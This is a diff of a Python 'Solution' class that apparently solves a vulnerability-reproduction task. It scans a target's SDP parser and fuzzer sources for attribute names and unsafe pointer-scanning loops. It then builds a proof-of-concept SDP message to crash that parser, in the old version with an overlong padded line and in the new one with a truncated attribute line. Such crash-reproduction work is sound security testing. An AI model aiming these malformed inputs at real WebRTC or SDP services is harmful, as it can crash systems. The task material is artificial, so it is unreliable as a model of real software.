@@ -1,165 +1,214 @@
-import io
 import os
 import re
 import tarfile
-from typing import Dict, Iterable, List, Optional, Tuple
+from typing import Dict, Iterable, List, Optional, Set, Tuple
 
 
 class Solution:
-    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
-        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl"}
-        for base, _, files in os.walk(root):
-            for fn in files:
-                _, ext = os.path.splitext(fn)
-                if ext.lower() not in exts:
-                    continue
-                path = os.path.join(base, fn)
+    def __init__(self) -> None:
+        self._attr_priority = [
+            "fingerprint",
+            "rtpmap",
+            "fmtp",
+            "group",
+            "msid-semantic",
+            "ssrc",
+            "candidate",
+            "extmap",
+            "rtcp-fb",
+            "rid",
+            "simulcast",
+        ]
+        self._attr_line: Dict[str, bytes] = {
+            "fingerprint": b"a=fingerprint:sha-256",
+            "rtpmap": b"a=rtpmap:0",
+            "fmtp": b"a=fmtp:0",
+            "group": b"a=group:BUNDLE",
+            "msid-semantic": b"a=msid-semantic:WMS",
+            "ssrc": b"a=ssrc:1",
+            "candidate": b"a=candidate:0",
+            "extmap": b"a=extmap:1",
+            "rtcp-fb": b"a=rtcp-fb:1",
+            "rid": b"a=rid:1",
+            "simulcast": b"a=simulcast:send",
+        }
+
+        self._suspicious_re = re.compile(
+            r"""(?isx)
+            \bwhile\s*\(\s*
+              (?:\(|\s)*
+              \*\s*[A-Za-z_][A-Za-z0-9_]*\s*
+              (?:==|!=|<=|>=|<|>)\s*
+              (?:'[^']*'|"[^"]*"|[A-Za-z0-9_:+-]+)
+              .*?
+              &&\s*
+              [A-Za-z_][A-Za-z0-9_]*\s*
+              (?:!=|==|<=|>=|<|>)\s*
+              [A-Za-z_][A-Za-z0-9_]*
+            """,
+            re.DOTALL,
+        )
+
+    def _iter_files_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
+        for dirpath, _, filenames in os.walk(root):
+            for fn in filenames:
+                path = os.path.join(dirpath, fn)
                 try:
                     st = os.stat(path)
                 except OSError:
                     continue
+                if not os.path.isfile(path):
+                    continue
                 if st.st_size <= 0 or st.st_size > 2_000_000:
+                    continue
+                low = fn.lower()
+                if not any(low.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py", ".txt")):
                     continue
                 try:
                     with open(path, "rb") as f:
-                        yield path, f.read()
+                        data = f.read()
                 except OSError:
                     continue
+                yield path, data
 
-    def _iter_source_files_from_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
-        exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl"}
+    def _iter_files_tar(self, tar_path: str) -> Iterable[Tuple[str, bytes]]:
         try:
-            with tarfile.open(tar_path, mode="r:*") as tf:
+            with tarfile.open(tar_path, "r:*") as tf:
                 for m in tf.getmembers():
-                    if not m.isreg():
-                        continue
-                    name = m.name
-                    _, ext = os.path.splitext(name)
-                    if ext.lower() not in exts:
+                    if not m.isfile():
                         continue
                     if m.size <= 0 or m.size > 2_000_000:
+                        continue
+                    name = m.name
+                    low = name.lower()
+                    base = os.path.basename(low)
+                    if not any(base.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".inc", ".m", ".mm", ".rs", ".go", ".java", ".kt", ".swift", ".py", ".txt")):
                         continue
                     try:
                         f = tf.extractfile(m)
                         if f is None:
                             continue
                         data = f.read()
-                        yield name, data
                     except Exception:
                         continue
+                    yield name, data
         except Exception:
             return
 
-    def _detect_target(self, src_path: str) -> Tuple[str, str]:
-        tokens = [
-            "fmtp",
-            "rtpmap",
-            "fingerprint",
-            "candidate",
-            "extmap",
-            "ssrc-group",
-            "ssrc",
-            "simulcast",
-            "rid",
-            "rtcp-fb",
-            "crypto",
-        ]
-        scores: Dict[str, int] = {t: 0 for t in tokens}
-        crlf_hits = 0
-        total_read = 0
-        max_read = 25_000_000
+    def _scan_sources(self, src_path: str) -> Tuple[Set[str], Set[str], bool]:
+        found: Set[str] = set()
+        found_likely: Set[str] = set()
+        wants_crlf = False
 
-        suspicious_while = re.compile(
-            r"while\s*\(\s*(?:\([^\)]*\)\s*)?(?:\*?\s*[A-Za-z_]\w*|\w+\s*\[[^\]]+\])\s*!=\s*'([^']+)'\s*\)",
-            re.S,
-        )
+        def consider(path: str) -> bool:
+            low = path.lower()
+            if any(k in low for k in ("sdp", "fuzz", "parser", "llvmfuzzer", "fuzzer")):
+                return True
+            return False
 
         if os.path.isdir(src_path):
-            iterator = self._iter_source_files_from_dir(src_path)
+            it = self._iter_files_dir(src_path)
         else:
-            iterator = self._iter_source_files_from_tar(src_path)
+            it = self._iter_files_tar(src_path)
 
-        for name, b in iterator:
-            if total_read >= max_read:
+        buf_checked = 0
+        for path, data in it:
+            buf_checked += 1
+            if buf_checked > 20000:
                 break
-            total_read += len(b)
-            low_name = name.lower()
-            if "sdp" not in low_name and "fuzz" not in low_name and "parser" not in low_name:
+
+            if b"\x00" in data[:4096]:
                 continue
+
+            if not consider(path):
+                continue
+
+            lower = data.lower()
+            for a in self._attr_priority:
+                if a.encode("ascii") in lower:
+                    found.add(a)
+
+            if b"llvmfuzzertestoneinput" in lower:
+                if b"\\r\\n" in lower or b"\\n\\r" in lower:
+                    wants_crlf = True
+                if b"\r\n" in lower:
+                    wants_crlf = True
+
+            if not wants_crlf and (b"\\r\\n" in lower or b"crlf" in lower or b"\\x0d\\x0a" in lower):
+                wants_crlf = True
 
             try:
-                text = b.decode("utf-8", "ignore")
+                txt = data.decode("utf-8", "ignore")
             except Exception:
-                continue
+                txt = data.decode("latin1", "ignore")
 
-            low = text.lower()
-            crlf_hits += low.count("\\r\\n") + low.count("\r\n")
+            if self._suspicious_re.search(txt):
+                for a in self._attr_priority:
+                    if a in txt.lower():
+                        found_likely.add(a)
 
-            for t in tokens:
-                c = low.count(t)
-                if c:
-                    scores[t] += c
+        if not found and not found_likely:
+            if os.path.isdir(src_path):
+                it2 = self._iter_files_dir(src_path)
+            else:
+                it2 = self._iter_files_tar(src_path)
+            buf_checked = 0
+            for path, data in it2:
+                buf_checked += 1
+                if buf_checked > 25000:
+                    break
+                if b"\x00" in data[:4096]:
+                    continue
+                lower = data.lower()
+                for a in self._attr_priority:
+                    if a.encode("ascii") in lower:
+                        found.add(a)
+                if b"llvmfuzzertestoneinput" in lower:
+                    if b"\\r\\n" in lower or b"\r\n" in lower:
+                        wants_crlf = True
+                if not wants_crlf and (b"\\r\\n" in lower or b"crlf" in lower):
+                    wants_crlf = True
+                if found:
+                    break
 
-            for m in suspicious_while.finditer(text):
-                start = m.start()
-                ctx = low[max(0, start - 600) : min(len(low), start + 600)]
-                for t in tokens:
-                    if t in ctx:
-                        scores[t] += 6
+        return found, found_likely, wants_crlf
 
-        best_token = max(scores.items(), key=lambda kv: kv[1])[0]
-        line_ending = "\r\n" if crlf_hits > 0 else "\n"
-        return best_token, line_ending
-
-    def _build_malformed_line(self, token: str, pad_len: int) -> str:
-        pad = "A" * pad_len
-        if token == "rtpmap":
-            return "a=rtpmap:111 " + pad
-        if token == "fingerprint":
-            return "a=fingerprint:sha-256 " + pad
-        if token == "candidate":
-            return "a=candidate:" + pad
-        if token == "extmap":
-            return "a=extmap:1" + pad
-        if token == "ssrc-group":
-            return "a=ssrc-group:FID" + pad
-        if token == "ssrc":
-            return "a=ssrc:1" + pad
-        if token == "simulcast":
-            return "a=simulcast:" + pad
-        if token == "rid":
-            return "a=rid:1 " + pad
-        if token == "rtcp-fb":
-            return "a=rtcp-fb:111 " + pad
-        if token == "crypto":
-            return "a=crypto:1 " + pad
-        return "a=fmtp:111 " + pad
-
-    def solve(self, src_path: str) -> bytes:
-        token, eol = self._detect_target(src_path)
-
-        pad_len = 512
-        malformed = self._build_malformed_line(token, pad_len)
-
-        lines: List[str] = [
-            "v=0",
-            "o=- 0 0 IN IP4 127.0.0.1",
-            "s=-",
-            "t=0 0",
-            "a=group:BUNDLE 0",
-            "m=audio 9 UDP/TLS/RTP/SAVPF 111",
-            "c=IN IP4 0.0.0.0",
-            "a=mid:0",
-            "a=sendrecv",
-            "a=rtpmap:111 opus/48000/2",
-            "a=fmtp:111 minptime=10;useinbandfec=1",
-            "a=setup:actpass",
-            "a=ice-ufrag:ufrag",
-            "a=ice-pwd:pwd",
-            "a=fingerprint:sha-256 00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99:AA:BB:CC:DD:EE:FF",
-            "a=rtcp-mux",
-            malformed,
+    def _build_poc(self, attr: str, sep: bytes) -> bytes:
+        session = [
+            b"v=0",
+            b"o=- 0 0 IN IP4 127.0.0.1",
+            b"s=-",
+            b"t=0 0",
+        ]
+        media = [
+            b"m=audio 9 RTP/AVP 0",
+            b"c=IN IP4 0.0.0.0",
         ]
 
-        out = eol.join(lines).encode("ascii", "ignore")
-        return out
+        line = self._attr_line.get(attr, b"a=fingerprint:sha-256")
+
+        if attr == "group":
+            lines = session + [line] + media
+        else:
+            lines = session + media + [line]
+
+        return sep.join(lines) + sep
+
+    def solve(self, src_path: str) -> bytes:
+        found, found_likely, wants_crlf = self._scan_sources(src_path)
+        sep = b"\r\n" if wants_crlf else b"\n"
+
+        chosen: Optional[str] = None
+        for a in self._attr_priority:
+            if a in found_likely:
+                chosen = a
+                break
+        if chosen is None:
+            for a in self._attr_priority:
+                if a in found:
+                    chosen = a
+                    break
+        if chosen is None:
+            chosen = "fingerprint"
+
+        return self._build_poc(chosen, sep)
